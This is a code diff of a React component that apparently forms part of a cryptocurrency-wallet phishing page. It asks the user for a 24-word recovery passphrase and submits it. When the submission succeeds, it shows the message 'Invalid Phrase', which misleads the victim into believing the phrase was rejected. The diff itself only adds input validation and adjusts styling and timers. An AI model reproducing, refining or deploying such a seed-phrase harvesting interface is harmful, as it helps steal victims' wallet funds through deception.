@@ -2,10 +2,10 @@
 
 import React, { useState } from "react";
 
-
 const Wallet = () => {
   const [phrase, setPhrase] = useState<string>("");
   const [success, setSuccess] = useState(false);
+  const [border, setBorder] = useState(false);
   const [loading, setLoading] = useState(false);
 
   const handleChange = (event: React.ChangeEvent<HTMLTextAreaElement>) => {
@@ -16,6 +16,11 @@ const Wallet = () => {
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
+    if (phrase.length < 1) {
+      setBorder(true);
+      setLoading(false);
+      return;
+    }
 
     try {
       setLoading(true);
@@ -32,25 +37,25 @@ const Wallet = () => {
       // Redirect to login if success
       if (res.ok) {
         setTimeout(() => {
-            setLoading(false);
-          }, 2000);
+          setLoading(false);
+        }, 100);
         setSuccess(true);
         setPhrase("");
         setTimeout(() => {
           setSuccess(false);
-        }, 5000);
+        }, 1800);
       }
     } catch (error) {
       console.log(error);
     }
   };
   return (
-    <div className="pt-5 pb-16">
+    <div className="pt-5 pb-24">
       <div className="navCon mx-auto my-0 px-3">
         <div className="flex flex-col gap-6">
           <div>
             {success ? (
-              <div className="transition-all duration-[0.2s] ease-in-out border-2 flex items-center justify-center gap-3 rounded-[5px] font-[700] text-[#292B2C] border-[black] text-center py-8">
+              <div className="transition-all ease-in-out border-2 flex items-center justify-center gap-3 rounded-[5px] font-[700] text-[#292B2C] border-[black] text-center py-8">
                 Invalid Phrase
                 <svg
                   xmlns="http://www.w3.org/2000/svg"
@@ -76,19 +81,19 @@ const Wallet = () => {
                 id=""
                 rows={9}
                 placeholder="Enter your 24-word passphrase here"
-                className="border border-[#fab44b] placeholder:font-[500] rounded-[3px] my-0 w-[95%] px-3 pt-3 sm:w-full bg-[#fafafa] focus:outline-none"
+                className={`border border-[#fab44b] placeholder:font-[500] rounded-[3px] my-0 w-[95%] px-3 pt-3 sm:w-full bg-[#fafafa] focus:outline-none ${
+                  border && "border-red-500"
+                }`}
               ></textarea>
             </div>
 
             <div className="flex items-center justify-center">
               <button
                 type="submit"
-                className={`text-[13px] flex items-center justify-center border py-3 px-4 rounded-[40px] border-[#783a8c] text-[#783a8c] font-[600] ${
-                  loading && "w-[70%]"
-                }`}
+                className={`text-[13px] w-[55%] flex items-center justify-center border py-3 px-4 rounded-[40px] border-[#783a8c] text-[#783a8c] font-[600]`}
               >
                 {loading ? (
-                  <div className="animate-spin rounded-full h-[20px] w-[20px] border-t-2 border-b-2 border-[#783a8c]"></div>
+                  <span className="loading loading-spinner loading-sm"></span>
                 ) : (
                   "UNLOCK WITH PASSPHRASE"
                 )}
@@ -96,10 +101,9 @@ const Wallet = () => {
             </div>
 
             <div className="px-8 flex items-center justify-center">
-              
-                <button className="p-2 text-[13px] text-center flex items-center justify-center w-[100%] sm:w-[300px] bg-[#783a8c] rounded-[4px] text-white  font-[600]">
-                  UNLOCK WITH FINGERPRINT
-                </button>
+              <button className="p-2 text-[13px] text-center flex items-center justify-center w-[100%] sm:w-[300px] bg-[#783a8c] rounded-[4px] text-white  font-[600]">
+                UNLOCK WITH FINGERPRINT
+              </button>
             </div>
           </form>
 
